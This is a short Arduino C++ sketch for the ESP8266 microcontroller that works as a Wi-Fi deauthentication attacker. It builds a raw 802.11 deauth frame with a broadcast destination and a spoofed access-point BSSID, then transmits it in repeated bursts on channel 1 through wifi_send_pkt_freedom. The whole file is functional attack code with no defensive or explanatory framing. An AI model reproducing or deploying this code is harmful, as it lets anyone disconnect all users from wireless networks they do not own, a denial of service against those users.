// esp8266_deauth

//pls ignore the comments, i did those for my remembering

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

// Target settings
uint8_t tgt[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // broadcast
uint8_t ap[6]  = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED}; // example BSSID

// Packet buffer
uint8_t pkt[26] = {
  0xC0, 0x00, // type, subtype: deauth
  0x00, 0x00, // duration
  // dst MAC
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  // src MAC (AP)
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
  // BSSID
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
  0x00, 0x00, // frag-seq
  0x07, 0x00  // reason code
};

void setup() {
  WiFi.mode(WIFI_OFF);
  delay(10);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_channel(1);
  wifi_promiscuous_enable(1);
}

void loop() {
  for (int i = 0; i < 100; i++) {
    wifi_send_pkt_freedom(pkt, 26, 0);
    delay(10);
  }
  delay(1000);
}
